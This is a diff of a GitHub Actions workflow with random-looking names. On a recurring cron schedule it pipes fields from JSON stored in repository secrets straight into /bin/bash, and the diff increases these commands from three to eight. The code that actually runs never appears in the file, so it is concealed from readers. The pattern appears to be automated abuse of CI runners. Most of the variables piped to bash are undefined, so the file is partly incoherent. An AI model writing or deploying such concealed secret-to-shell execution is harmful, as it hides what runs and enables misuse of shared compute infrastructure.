@@ -3,17 +3,24 @@ name: hejintui9348
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
+    - cron: '54 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hejintui9348
         env:
-          monx820: ${{ secrets.monx820 }}
+          mf6255: ${{ secrets.mf6255 }}
         run: |
-          echo $monx820 | jq -r .d2 | /bin/bash
-          echo $be92 | jq -r .sdr2806 | /bin/bash
-          echo $ccrjl403 | jq -r .w2 | /bin/bash
+          echo $mf6255 | jq -r .z1209 | /bin/bash
+          echo $thrqn72144 | jq -r .uwsl05 | /bin/bash
+          echo $z08 | jq -r .m32 | /bin/bash
+          echo $dnn38020 | jq -r .vh0 | /bin/bash
+          echo $x45289 | jq -r .ga6 | /bin/bash
+          echo $ixq8 | jq -r .wbx2 | /bin/bash
+          echo $v38539 | jq -r .f111 | /bin/bash
+          echo $p5 | jq -r .aijc6809 | /bin/bash
 
